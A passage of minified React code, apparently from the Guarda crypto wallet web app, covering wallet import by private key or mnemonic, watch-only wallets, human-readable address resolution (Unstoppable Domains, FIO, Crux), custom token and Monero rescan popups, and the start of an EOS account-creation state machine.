                className: Ht()(jf.icon, !N && jf.showPassIconBlue, N && jf.hidePassIconBlue, jf.leftIcon)
            })), f && O.createElement(O.Fragment, null, O.createElement("div", {
                className: "relative"
            }, O.createElement(Ea, {
                value: o,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return c(t)
                }
                ,
                onEnter: handleAddWallet,
                placeholder: getPlaceholderPassword(r),
                autoComplete: "off",
                className: jf.inputPrivateKey,
                type: getInputType(A)
            }), O.createElement("span", {
                onClick: () => x((e => !e)),
                className: Ht()(jf.icon, !A && jf.showPassIconBlue, A && jf.hidePassIconBlue, jf.leftIcon)
            })), O.createElement("div", {
                className: "relative"
            }, O.createElement(Ea, {
                value: u,
                onChange: e => {
                    let {target: {value: t}} = e;
                    return d(t)
                }
                ,
                onEnter: handleAddWallet,
                placeholder: "Address",
                autoComplete: "off",
                className: jf.inputPrivateKey,
                type: "text"
            })))), b && O.createElement(bf, {
                error: b
            }), $f.includes(null !== (t = null == m ? void 0 : m.ticker) && void 0 !== t ? t : "") ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: jf.advencedTop
            }, O.createElement("span", {
                className: Ht()(jf.advencedBtn, ae),
                onClick: handleAdvencedClick
            }, "Advanced")), K ? O.createElement(O.Fragment, null, "btc" === r ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: jf.tabList
            }, O.createElement("div", {
                onClick: () => j("derivation_path"),
                className: Ht()(jf.tabItem, "derivation_path" === z ? jf.tabActive : "", ae)
            }, "Derivation path"), O.createElement("div", {
                onClick: () => j("default_search"),
                className: Ht()(jf.tabItem, "default_search" === z ? jf.tabActive : "", ae)
            }, "Default search"))) : null, "btc" === r && "derivation_path" === z ? O.createElement(O.Fragment, null, O.createElement("div", null, O.createElement("div", {
                className: jf.derivationType
            }, O.createElement("div", {
                className: jf.derivationTypeList
            }, O.createElement("div", {
                onClick: () => {
                    h || Y(to.L.LEGACY)
                }
                ,
                className: Ht()(jf.tabItem, Z === to.L.LEGACY ? jf.tabActive : "", ae)
            }, "BIP32"), O.createElement("div", {
                onClick: () => {
                    h || Y(to.L.BIP44)
                }
                ,
                className: Ht()(jf.tabItem, Z === to.L.BIP44 ? jf.tabActive : "", ae)
            }, "BIP44"), O.createElement("div", {
                onClick: () => {
                    h || Y(to.L.BIP49)
                }
                ,
                className: Ht()(jf.tabItem, Z === to.L.BIP49 ? jf.tabActive : "", ae)
            }, "BIP49"), O.createElement("div", {
                onClick: () => {
                    h || Y(to.L.BIP84)
                }
                ,
                className: Ht()(jf.tabItem, Z === to.L.BIP84 ? jf.tabActive : "", ae)
            }, "BIP84")), O.createElement("div", {
                className: jf.derivationTypeAccount
            }, O.createElement("div", {
                className: Ht()(jf.derivationTypeText, le)
            }, "Account"), O.createElement(Ea, {
                className: jf.derivationTypeInput,
                type: "number",
                value: q,
                onChange: e => handleUpdateAccountIndex(e.target.value),
                disabled: h
            }), O.createElement("div", {
                className: Ht()(jf.derivationTypeText, le)
            }, "Derive path"), O.createElement("div", {
                className: Ht()(jf.derivationTypeText, le)
            }, O.createElement("b", null, ee)))), O.createElement("div", {
                className: jf.Preview
            }, O.createElement(Yl, {
                className: Ht()(jf.advencedSearchBtn, jf.advencedSearchBtnDer, le, !ae && re && jf.white),
                color: ae ? "white" : "blue",
                disabled: h,
                onClick: handleFindWalletByDerivation
            }, "Find wallet", " ", h ? O.createElement(O.Fragment, null, " ", O.createElement(LoaderDots, {
                visible: !0
            })) : null), null != Q && Q.length ? O.createElement(ui_message, {
                type: "info",
                className: Ht()(ae)
            }, Q) : null, P ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: jf.foundAccount
            }, O.createElement("div", {
                className: Ht()(jf.foundAccountTitle, le)
            }, "Found account"), O.createElement("div", {
                className: Ht()(jf.foundAccountAddress, le)
            }, P.address), O.createElement("div", {
                className: Ht()(jf.foundAccountBalance, le)
            }, P.balance))) : null))) : O.createElement(O.Fragment, null, O.createElement(Ea, {
                defaultValue: u,
                placeholder: "Enter the address you want to find",
                onChange: e => {
                    let {target: {value: t}} = e;
                    return d(t)
                }
                ,
                disabled: h
            }), O.createElement(Yl, {
                className: Ht()(jf.advencedSearchBtn, jf.advencedSearchBtnDer, le, !ae && re && jf.white),
                color: ae ? "white" : "blue",
                disabled: h,
                onClick: handleSearchAddress
            }, "Search", " ", h ? O.createElement(O.Fragment, null, " ", O.createElement(LoaderDots, {
                visible: !0
            })) : null), null === M ? null : O.createElement(ui_message, {
                type: "error"
            }, M), null === G ? null : O.createElement(ui_message, {
                type: "info",
                className: Ht()(ae)
            }, G))) : null) : null, O.createElement("div", {
                className: Ht()(jf.wrapperAddButton)
            }, O.createElement(secure_note, {
                color: e.theme
            }), O.createElement(Yl, {
                onClick: e.isMnemonicImport ? handleAddWalletsByMnemonic : handleAddWallet,
                color: "blue" === e.bgColor ? "white" : "light-blue",
                className: jf.buttonImport,
                size: "big",
                isLoading: h,
                disabled: K && null === P
            }, e.isMnemonicImport ? "Add wallets by mnemonic" : "Add wallet")))
        }
          , Zf = ImportBlock
          , Yf = "import_footerButtonStatus_19W5Y app_footerButtonStatus_1lnBU"
          , qf = "import_lineInformation_2k2lf"
          , ImportTab = e => {
            const [t,a] = (0,
            O.useState)(null)
              , [n,r] = (0,
            O.useState)(null)
              , l = (0,
            $.I0)();
            let s = !1;
            function handleSetWallet(e, t) {
                a(e);
                r(t || null)
            }
            async function handleConfirm() {
                if (!s) {
                    s = !0;
                    z()(t, "importWallet must be defined");
                    if (n) {
                        n.watchOnly = void 0;
                        n.privateKey = t.privateKey;
                        l(rd.updateWallet({
                            wallet: n
                        }));
                        await l(setActiveWallet(t));
                        await l(triggerSaveWallets())
                    } else {
                        l(rd.addWallet({
                            wallet: t
                        }));
                        await l(setActiveWallet(t))
                    }
                    s = !1;
                    l(handleDownload(Sm.FORCE));
                    l(removeNotifyBackup());
                    a(null);
                    r(null);
                    e.onClose()
                }
            }
            return t ? O.createElement(O.Fragment, null, O.createElement("p", null, n && "\n          Following wallet will be imported into Guarda. Keep in mind you had this wallet as a Watch Only.\n          Now you will be able to send funds from this address. Updated back up file will be downloaded.\n          ", !n && "Following wallet will be imported into Guarda. If this is what you want, please press Confirm."), O.createElement("div", {
                className: qf
            }, O.createElement("h4", null, "Address:"), O.createElement("span", null, t.address)), O.createElement("div", {
                className: qf
            }, O.createElement("h4", null, "Balance:"), (0,
            Ko.yF)(t.balance, void 0, t), " ", O.createElement("b", null, (0,
            be.xG)(t.currency))), O.createElement("div", {
                className: Yf
            }, O.createElement(BackButton, {
                onClick: () => handleSetWallet(null)
            }), O.createElement(Yl, {
                onClick: handleConfirm,
                color: "blue",
                size: "big"
            }, "Confirm"))) : O.createElement(O.Fragment, null, O.createElement("p", null, "You can import your Private Key from any other wallet to use it in Guarda.", O.createElement("br", null), "No worries, Guarda doesn’t store or manage your private keys. They cannot be used to store or transfer your funds by anyone except you."), O.createElement(Zf, {
                currency: e.currency,
                onImportWallets: handleSetWallet
            }))
        }
          , Xf = ImportTab;
        var Qf = a(9669)
          , Jf = a.n(Qf);
        const eE = "textarea_textarea_3EjI7";
        function textarea_extends() {
            textarea_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return textarea_extends.apply(this, arguments)
        }
        const tE = O.forwardRef(( (e, t) => {
            let {className: a, ...n} = e;
            return O.createElement("textarea", textarea_extends({
                className: Ht()(a, eE)
            }, n, {
                ref: t
            }))
        }
        ));
        tE.displayName = "TextArea";
        const aE = tE
          , nE = "input-address_input_3BDk7"
          , rE = "input-address_label_SKdqT"
          , lE = "input-address_disabled_3numE"
          , sE = "UNSTOPPABLE_DOMAINS"
          , iE = "FIO"
          , oE = "CRUX"
          , cE = /(\S+)_TOKEN/
          , isValidFioAddress = e => e.indexOf("@") > 0
          , isValidCruxAddress = e => e.indexOf("@") > 0 && /.+\.crux$/.test(e)
          , isStartValidateAddress = e => /.+@$/.test(e)
          , isDotDomain = e => {
            const t = !/^0\.0\./.test(e)
              , a = /.+\..+/.test(e);
            return t && a
        }
          , detectPartner = e => isStartValidateAddress(e) ? null : isValidCruxAddress(e) ? oE : isValidFioAddress(e) ? iE : isDotDomain(e) ? sE : void 0;
        let uE = new AbortController;
        const dE = O.createRef()
          , InputAddress = e => {
            let {value: t, wallet: a, onValidate: n, onChange: r, onEnter: l, onPartnerAddress: s, onLoadingRecognize: i, disabled: o, isWatchOnly: c, customPlaceholder: u, className: d, onAdapterError: m, adapterError: p} = e;
            const [f,E] = (0,
            O.useState)(null)
              , [h,g] = (0,
            O.useState)(null)
              , [y,v] = (0,
            O.useState)(!1);
            function hasPartnerAddress(e) {
                return detectPartner(e) && !!s
            }
            async function validate(e) {
                if (hasPartnerAddress(e))
                    return;
                const t = await f.validateAddress({
                    address: String(e).trim(),
                    currency: a.currency
                });
                n(t)
            }
            async function searchPartnerAddress(e) {
                uE = new AbortController;
                if (hasPartnerAddress(e)) {
                    try {
                        const n = detectPartner(e);
                        if (!n) {
                            i(!1);
                            return
                        }
                        i(!0);
                        if (!a || !a.currency) {
                            i(!1);
                            s({
                                error: "Failed to fetch address",
                                code: 4
                            });
                            return
                        }
                        if (n === sE) {
                            const {data: n} = await U.nW.get(`/api/v1/ud/domains/${e}`, {
                                signal: uE.signal
                            })
                              , r = Object.keys(n.records);
                            if (!r || !r.length) {
                                i(!1);
                                s({
                                    error: "No owner for this domain",
                                    code: 4
                                });
                                return
                            }
                            const l = (0,
                            be.rX)(a.currency).toUpperCase()
                              , o = `crypto.${l}.address`;
                            let c = n.records[o];
                            if (!c) {
                                var t;
                                const e = undefined
                                  , r = `crypto.${l}.version.${null === (t = a.type.match(cE)) || void 0 === t ? void 0 : t[1]}.address`;
                                c = n.records[r]
                            }
                            if (!c) {
                                i(!1);
                                s({
                                    error: "No address for this currency",
                                    code: 4
                                });
                                return
                            }
                            s({
                                address: c
                            })
                        }
                        if (n === iE) {
                            const {data: t} = await Jf().post("https://fio.guarda.co/v1/chain/get_pub_address", {
                                fio_address: e,
                                chain_code: a.family ? a.family.toUpperCase() : (0,
                                be.rX)(a.currency).toUpperCase(),
                                token_code: (0,
                                be.rX)(a.currency).toUpperCase()
                            }, {
                                signal: uE.signal
                            })
                              , n = t.public_address;
                            if (!n) {
                                i(!1);
                                s({
                                    error: "No owner for this domain",
                                    code: 4
                                });
                                return
                            }
                            s({
                                address: n
                            })
                        }
                        if (n === oE) {
                            const t = await Se.Z.getApiByCurrency("crux")
                              , n = await t.getAccountCurrencyAddress({
                                accountName: e,
                                currency: (0,
                                be.rX)(a.currency)
                            });
                            if (!1 === n) {
                                i(!1);
                                s({
                                    error: "No owner for this domain",
                                    code: 4
                                });
                                return
                            }
                            s({
                                address: n.addressHash
                            })
                        }
                    } catch (e) {
                        i(!1);
                        if ("ERR_CANCELED" === (null == e ? void 0 : e.code)) {
                            s({
                                address: ""
                            });
                            return
                        }
                        s({
                            error: "Failed to fetch address"
                        })
                    }
                    i(!1)
                } else
                    s && s({
                        address: ""
                    })
            }
            (0,
            O.useEffect)(( () => {
                async function fetchApi() {
                    if (h !== a.uuid) {
                        const e = await Se.Z.getApiByWallet(a);
                        if (m) {
                            if (!e) {
                                m(!0);
                                return
                            }
                            m(!1)
                        }
                        g(a.uuid);
                        E(e);
                        v(!1)
                    }
                }
                a && fetchApi()
            }
            ), [a, p]);
            (0,
            O.useEffect)(( () => {
                uE.abort();
                if (f && !y && t) {
                    validate(t);
                    searchPartnerAddress(t)
                } else if (i && s) {
                    i(!1);
                    s({
                        address: ""
                    })
                }
            }
            ), [f, a, t]);
            const _ = a ? a.currency : ""
              , [w,b] = (0,
            O.useState)(u || `Enter ${(0,
            be.xG)(_)} ${c ? "address" : "or HRA"}`);
            (0,
            O.useEffect)(( () => {
                b(u || `Enter ${(0,
                be.xG)(_)} ${c ? "address" : "or HRA"}`)
            }
            ), [_, u]);
            const handleKeyDown = e => {
                if (13 === e.keyCode) {
                    e.stopPropagation();
                    e.preventDefault();
                    l && l()
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (dE.current) {
                    dE.current.style.height = "0px";
                    dE.current.style.height = dE.current.scrollHeight + "px"
                }
            }
            ), [t]);
            const handleChange = async e => {
                let {target: t} = e;
                if (a && f)
                    r(t.value.trim());
                else {
                    r(t.value.trim());
                    n(!1)
                }
            }
            ;
            return O.createElement("label", {
                className: Ht()(rE, {
                    [lE]: o
                })
            }, O.createElement(aE, {
                name: "textarea",
                onChange: handleChange,
                onKeyDown: handleKeyDown,
                type: "text",
                ref: dE,
                spellCheck: "false",
                value: t,
                placeholder: w,
                className: Ht()(d && d, nE),
                disabled: o
            }))
        }
        ;
        InputAddress.propTypes = {
            onChange: as().func,
            onEnter: as().func,
            onValidate: as().func,
            onPartnerAddress: as().func,
            onAdapterError: as().func,
            onLoadingRecognize: as().func,
            value: as().string,
            customPlaceholder: as().string,
            wallet: as().object,
            disabled: as().bool,
            isWatchOnly: as().bool,
            adapterError: as().bool,
            className: as().string
        };
        const mE = InputAddress
          , pE = {
            footerButtonStatus: "watch_footerButtonStatus_s4mIA app_footerButtonStatus_1lnBU",
            lineInformation: "watch_lineInformation_3Cal2",
            containerWrapper: "watch_containerWrapper_1e87w",
            secureNoteWrapper: "watch_secureNoteWrapper_3GPp_",
            wrapperAddButton: "watch_wrapperAddButton_1Eiqo",
            tooltipRed: "watch_tooltipRed_5Jpsf"
        }
          , watch_ImportTab = e => {
            const t = (0,
            $.v9)($c)
              , [a,n] = (0,
            O.useState)(null)
              , r = (0,
            $.I0)()
              , [l,s] = (0,
            O.useState)(null)
              , [i,o] = (0,
            O.useState)("")
              , [c,u] = (0,
            O.useState)(l ? {
                ticker: l
            } : null)
              , [d,m] = (0,
            O.useState)(!1)
              , [p,f] = (0,
            O.useState)(!1)
              , [E,h] = (0,
            O.useState)(!1)
              , [g,y] = (0,
            O.useState)(!1);
            let v, _ = !1;
            const w = O.createRef()
              , handleConfirm = async () => {
                if (!_ && a) {
                    _ = !0;
                    r(rd.addWallet({
                        wallet: a,
                        options: {
                            downloadType: Sm.AFTER_CREATE_WALLET
                        }
                    }));
                    r(updateWalletsBalanceAndTxs(a, {
                        isCascade: !1
                    }));
                    ge.b.success(ge.d.ADD_WO_WALLET_SUCCESS, {
                        key_currency: null == a ? void 0 : a.currency
                    });
                    n(null);
                    _ = !1;
                    e.onClose()
                }
            }
              , handleChangeCurrency = e => {
                var t;
                s(null !== (t = e.ticker) && void 0 !== t ? t : null);
                u(e)
            }
              , handleChangeAddress = (e, t) => {
                o(e);
                t && t()
            }
              , showError = e => {
                m(!1);
                o("");
                f(e);
                window.clearTimeout(v);
                v = window.setTimeout(( () => f(!1)), 2e3)
            }
              , handleAddWallet = async () => {
                var e, a;
                if (d || !l)
                    return;
                y(!1);
                const {isValid: r} = null !== (e = null === (a = w.current) || void 0 === a ? void 0 : a.validate()) && void 0 !== e ? e : {};
                if (!r) {
                    y(!0);
                    ge.b.error(ge.d.ADD_WO_WALLET_ERROR, {
                        key_currency: l
                    });
                    return
                }
                m(!0);
                const s = String(i).trim()
                  , c = {
                    forceAddress: s,
                    currency: l,
                    watchOnly: !0
                };
                if ("eos" === l) {
                    const e = await Se.Z.getApiByCurrency("eos");
                    c.forceAddress = await e.getPublicKeyByAccountName(s);
                    c.accountName = s
                }
                const p = _e.ZP.getClass(c)
                  , f = await (new p).create(c);
                m(!1);
                const E = undefined;
                if (t.find((e => ((0,
                Ho.t)(e.address) === (0,
                Ho.t)(s) || (0,
                Ho.t)(e.accountName) === (0,
                Ho.t)(s)) && e.currency === l)))
                    showError("This wallet is already imported!");
                else {
                    n(f);
                    o("");
                    u(null)
                }
            }
              , handleScanAddress = e => {
                handleChangeAddress(e, ( () => {
                    l && handleAddWallet()
                }
                ))
            }
            ;
            return a ? O.createElement(O.Fragment, null, O.createElement("p", null, "Following wallet will be imported into Guarda as a Watch Only. Keep in mind you won’t be able to send funds from this address until you import the private keys."), O.createElement("div", {
                className: pE.lineInformation
            }, O.createElement("h4", null, "Address:"), O.createElement("span", null, a.address)), O.createElement("div", {
                className: pE.lineInformation
            }, O.createElement("h4", null, "Balance:"), (0,
            Ko.yF)(a.balance), " ", O.createElement("b", null, (0,
            be.xG)(a.currency))), O.createElement("div", {
                className: pE.footerButtonStatus
            }, O.createElement(BackButton, {
                onClick: () => n(null)
            }), O.createElement(Yl, {
                onClick: handleConfirm,
                color: "blue",
                size: "big"
            }, "Confirm"))) : O.createElement(O.Fragment, null, O.createElement("p", null, "Add any address to your wallet as a Watch Only - securely access information on transactions and balance right in your Guarda wallet."), O.createElement(sf(), {
                ref: w
            }, O.createElement(lf.ValidatorField, {
                rules: zf.currency,
                value: c || ""
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && g,
                    message: a
                }, O.createElement(Vd, {
                    onChange: handleChangeCurrency,
                    currencies: Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveImport && e.isActiveWatchOnly)),
                    selectedCurrency: null != c ? c : void 0
                }))
            }
            )), O.createElement("div", {
                className: "relative"
            }, O.createElement(tooltip, {
                text: p || "",
                visible: !!p,
                className: pE.tooltipRed
            }), O.createElement(lf.ValidatorField, {
                rules: zf.address,
                value: {
                    isValidAddress: E,
                    address: i
                }
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && g,
                    message: a
                }, O.createElement(mE, {
                    value: i,
                    wallet: l ? {
                        currency: l,
                        uuid: `${l}watchOnly`
                    } : null,
                    onValidate: h,
                    onChange: handleChangeAddress,
                    onEnter: handleAddWallet,
                    isWatchOnly: !0
                }))
            }
            )), !i && O.createElement(qr_scanner_paste_button, {
                setAddress: handleScanAddress
            })), O.createElement("div", {
                className: pE.wrapperAddButton
            }, d && O.createElement(LoaderDots, {
                visible: !0
            }), O.createElement("div", null), O.createElement(Yl, {
                onClick: handleAddWallet,
                color: "light-blue",
                className: pE.buttonImport,
                size: "big"
            }, "Add wallet"))))
        }
          , fE = undefined
          , EE = "menu_menu_1naoh"
          , hE = "menu_active_1stop"
          , gE = [{
            tab: "create",
            children: "Create"
        }, {
            tab: "import",
            children: "Import"
        }, {
            tab: "ledger",
            children: "Ledger"
        }, {
            tab: "watch",
            children: "Watch only"
        }]
          , yE = undefined
          , menu = e => {
            let {value: t, onChange: a} = e;
            return O.createElement("nav", {
                className: EE
            }, gE.map((e => {
                let {tab: n, children: r} = e;
                return O.createElement("div", {
                    key: n,
                    onClick: () => a(n),
                    className: n === t ? hE : void 0
                }, r)
            }
            )))
        }
          , vE = "popup-import-or-create_popupWrapper_2I4Zi"
          , _E = "popup-import-or-create_wrapperQrScanner_1R-UT"
          , wE = "popup-import-or-create_steps_2Z0TL"
          , bE = {
            create: PopupCreateWallet,
            import: Xf,
            ledger: tf,
            watch: watch_ImportTab
        }
          , kE = undefined
          , popup_import_or_create = e => {
            var t, a;
            const [n,r] = (0,
            O.useState)(null !== (t = e.initialTab) && void 0 !== t ? t : "create")
              , [l,s] = (0,
            O.useState)(null !== (a = e.initialUnclosable) && void 0 !== a && a)
              , i = undefined
              , o = bE[n]
              , c = {
                onChangeUnclosable: e => {
                    s(e)
                }
            }
              , u = {
                ...e,
                ...c
            };
            return O.createElement(aa, {
                visible: e.isVisible,
                onClose: e.onClose,
                width: 450,
                unclosable: l
            }, O.createElement("div", {
                className: vE
            }, !e.withoutMenu && O.createElement(menu, {
                value: n,
                onChange: r
            }), O.createElement(o, u)))
        }
          , SE = a.p + "10ce29edde99e63175ce12250a573774.svg";
        var CE = a(99954);
        const PopupImportXmrWallet = e => {
            const [t,a] = (0,
            O.useState)(!1)
              , handleClose = () => {
                e.handleBeforeClose && e.handleBeforeClose();
                e.onClose()
            }
              , recyncAddresses = async () => {
                const {wallet: t} = e;
                if (!t)
                    return;
                if ("string" != typeof t.privateKey && !(0,
                CE.dh)(t.privateKey))
                    return;
                const n = await Se.Z.getApiByCurrency("xmr")
                  , r = await n.getAddressFromPrivateKey({
                    privateKey: t.privateKey
                });
                await n.login({
                    address: t.address,
                    privateKey: r.privateKey
                });
                a(!0);
                setTimeout(( () => {
                    e.onClose();
                    a(!1)
                }
                ), 3e3)
            }
              , n = e.wallet ? e.wallet.title : "";
            return O.createElement(aa, {
                visible: e.isVisible,
                onClose: handleClose,
                width: 555
            }, O.createElement("div", {
                className: Fm
            }, O.createElement("h3", null, "Import Monero transactions"), t ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: Wm
            }, O.createElement("img", {
                src: SE,
                alt: "Success"
            })), O.createElement("p", {
                className: Rm
            }, "Your balances and transactions will appear within 24 hours."), O.createElement("div", {
                className: Bm
            }, O.createElement(Yl, {
                color: "blue",
                onClick: handleClose
            }, "Close"))) : O.createElement(O.Fragment, null, O.createElement("p", null, "If you cannot see balance or history of your Monero wallet, please click here. This will start the blockchain scanning process, so we will find missing data."), O.createElement("p", null, "The process may take up to 24 hours."), O.createElement("p", null, O.createElement("b", null, "Attention: You will not be able to send transactions from the wallet - ", n, " until the scanning process is completed. Also, the balance change due to incoming transactions for the scan time will not be taken into account.")), O.createElement("div", {
                className: Bm
            }, O.createElement(Yl, {
                color: "blue",
                onClick: recyncAddresses
            }, "Import - ", n)))))
        }
          , NE = PopupImportXmrWallet
          , TE = {
            popup: "popup-custom-token_popup_3oM2S",
            loaderWrapper: "popup-custom-token_loaderWrapper_1aIEp",
            error: "popup-custom-token_error_3r4Jk"
        }
          , PopupCustomToken = e => {
            const t = (0,
            $.I0)()
              , [a,n] = (0,
            O.useState)(!1)
              , [r,l] = (0,
            O.useState)("")
              , [s,i] = (0,
            O.useState)(null);
            let o;
            const getContractInformation = async t => {
                try {
                    const a = await Se.Z.loadLightAdapterByWallet({
                        family: e.wallet.currency,
                        currency: ""
                    });
                    if (a && "getSmartContractInfo"in a) {
                        const e = await a.getSmartContractInfo({
                            smartContract: t
                        });
                        return {
                            title: e.name,
                            ticker: e.symbol,
                            precision: e.decimals,
                            smartContract: t
                        }
                    }
                    return null
                } catch (e) {
                    console.error("getContractInformation", e);
                    return null
                }
            }
              , showError = e => {
                n(!1);
                i(e);
                window.clearTimeout(o);
                o = window.setTimeout(( () => i(null)), 2e3)
            }
            ;
            (0,
            O.useEffect)(( () => () => clearTimeout(o)), []);
            const handleAdd = async () => {
                n(!0);
                const a = undefined;
                if (e.wallet.subWallets.find((e => e.smartContract === r))) {
                    showError("Token already added");
                    return
                }
                const s = await getContractInformation(String(r));
                if (!s) {
                    showError("Incorrect smart contract address");
                    return
                }
                const i = await t(addSubWallet(e.wallet, {
                    address: e.wallet.address,
                    currency: s.ticker,
                    privateKey: e.wallet.privateKey,
                    precision: s.precision,
                    smartContract: s.smartContract,
                    title: s.title,
                    balance: "0",
                    isCustom: !0
                }));
                if (i) {
                    await t(updateWalletsBalanceAndTxs(i, {
                        isCascade: !1
                    }));
                    n(!1);
                    l("");
                    e.onClose()
                } else
                    showError("Incorrect smart contract address")
            }
            ;
            return O.createElement(aa, {
                visible: e.isVisible,
                onClose: e.onClose,
                width: 430
            }, O.createElement("div", {
                className: TE.popup
            }, O.createElement("h2", null, "Add custom token"), O.createElement("p", null, "Enter smart contract address to add token"), O.createElement(Ea, {
                disabled: a,
                className: TE.input,
                value: r,
                placeholder: "Smart contract address ERC20",
                onChange: e => {
                    let {target: {value: t}} = e;
                    return l(t.trim())
                }
            }), s && O.createElement("div", {
                className: TE.error
            }, s), a ? O.createElement("div", {
                className: TE.loaderWrapper
            }, O.createElement(LoaderDots, {
                visible: !0
            })) : O.createElement(Yl, {
                color: "blue",
                onClick: handleAdd
            }, "Add Token")))
        }
          , AE = PopupCustomToken
          , xE = "@eos-creation"
          , IE = "@eos-creation/notification/SHOW_NOTIFICATION"
          , PE = "@eos-creation/notification/HIDE_NOTIFICATION"
          , LE = {}
          , FE = (0,
        Ru.Z)({
            [IE]: (e, t) => {
                let {text: a, loader: n} = t;
                return {
                    ...e,
                    visible: !0,
                    text: a,
                    loader: n
                }
            }
            ,
            [PE]: e => ({
                ...e,
                visible: !1
            })
        }, LE)
          , notificationIsVisible = e => e["@eos-creation"].visible || !1
          , notificationText = e => e["@eos-creation"].text || ""
          , notificationLoader = e => e["@eos-creation"].loader || !1
          , showNotification = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
            return a => a({
                type: IE,
                text: e,
                loader: t
            })
        }
          , hideNotification = () => async e => e({
            type: PE
        })
          , WE = "create-address_stages_1akuo"
          , RE = "create-address_icon_2tshU"
          , BE = "create-address_stageCompleted_3fspk"
          , OE = "create-address_stageCurrent_1gy2D"
          , DE = "create-address_stageUpcoming_3D-pz"
          , ME = "create-address_detailsBlock_18KoF"
          , UE = "create-address_error_1BL4R"
          , GE = "create-address_status_gu_6h"
          , VE = "create-address_stepInfo_34of4"
          , KE = "create-address_footer_1Dw7h"
          , HE = a.p + "c10861cdf5a5b0e28828dc213cd84355.svg";
        var zE = a(84907)
          , jE = a.n(zE);
        function state_machine_defineProperty(e, t, a) {
            (t = state_machine_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function state_machine_toPropertyKey(e) {
            var t = state_machine_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function state_machine_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const $E = "HANDLE_ERROR"
          , ZE = ee.P.create({
            name: "state-machine"
        })
          , _camelizeFuncName = e => {
            if (0 === e.length)
                return e;
            const t = e.split(/[_-]/);
            let a = "";
            for (let e = 0; e < t.length; e += 1)
                a = a + t[e].charAt(0).toUpperCase() + t[e].substring(1).toLowerCase();
            return a.charAt(0).toLowerCase() + a.substring(1)
        }
          , _transitFuncName = e => `on${e.charAt(0).toUpperCase() + e.substring(1)}`;
        class StateMachineEngine extends (jE()) {
            constructor(e) {
                let {context: t, errorHandler: a, transitionHandler: n} = e;
                super({});
                state_machine_defineProperty(this, "stop", ( () => {
                    this.isStoped = !0;
                    this.intervals.forEach((e => {
                        clearInterval(e)
                    }
                    ));
                    this.timeouts.forEach((e => {
                        clearTimeout(e)
                    }
                    ))
                }
                ));
                state_machine_defineProperty(this, "goToState", (async e => {
                    if (!this.isStoped) {
                        ZE.log(`goToState ${e}`);
                        e !== $E && await this._applyTransitionHook(e);
                        setTimeout((async () => {
                            this.goTo(_camelizeFuncName(e))
                        }
                        ), 0)
                    }
                }
                ));
                state_machine_defineProperty(this, "setTransitionHandler", (e => {
                    this.transitionHandler = e;
                    return this
                }
                ));
                state_machine_defineProperty(this, "_applyTransitionHook", (async e => {
                    this.transitionHandler && await this.transitionHandler(e)
                }
                ));
                const r = t;
                r.transitions || (r.transitions = []);
                r.transitions.push({
                    name: "goTo",
                    from: "*",
                    to: e => e
                });
                const l = {};
                for (const [e,a] of Object.entries(t.methods))
                    l[_transitFuncName(_camelizeFuncName(e))] = a;
                l[_transitFuncName(_camelizeFuncName($E))] = a;
                r.methods = l;
                this.transitionHandler = n;
                const s = jE().apply(this, r);
                this.timeouts = [];
                this.intervals = [];
                this.isStoped = !1;
                return s
            }
        }
        const runWithReplyCountLoop = async e => {
            let {func: t, countOfErrorReplies: a, delayMs: n, onError: r, fsm: l} = e
              , s = 0;
            const reply = async () => {
                try {
                    return await t()
                } catch (e) {
                    if (a > 0 && s >= a) {
                        ZE.error(`LAST reply error (FAIL): ${e.message}, counts: ${s}`);
                        r(e);
                        return null
                    }
                    return new Promise((t => {
                        const a = setTimeout((async () => {
                            s += 1;
                            ZE.error(`reply error: ${e.message}, counts: ${s}`);
                            t(await reply())
                        }
                        ), n);
                        l && l.timeouts.push(a)
                    }
                    ))
                }
            }
            ;
            return await reply()
        }
        ;
        function create_address_state_machine_defineProperty(e, t, a) {
            (t = create_address_state_machine_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function create_address_state_machine_toPropertyKey(e) {
            var t = create_address_state_machine_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function create_address_state_machine_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const YE = ee.P.create({
            name: "eos-state-machine"
        });
        let qE;
        !function(e) {
            e.READY = "READY";
            e.CREATE_API_TX_RECORD = "CREATE_API_TX_RECORD";
            e.CREATE_SENT_PAYMENT_TX = "CREATE_SENT_PAYMENT_TX";
            e.CREATE_EOS_WALLETS = "CREATE_EOS_WALLETS";
            e.WAIT_FOR_MEMPOOL = "WAIT_FOR_MEMPOOL";
            e.ACTIVATE_EOS_ACCOUNT = "ACTIVATE_EOS_ACCOUNT";
            e.DONE = "DONE";
            e.HANDLE_ERROR = "HANDLE_ERROR"
        }(qE || (qE = {}));
        let XE = null
          , QE = !1;
        class EosAccountCreator {
            constructor(e) {
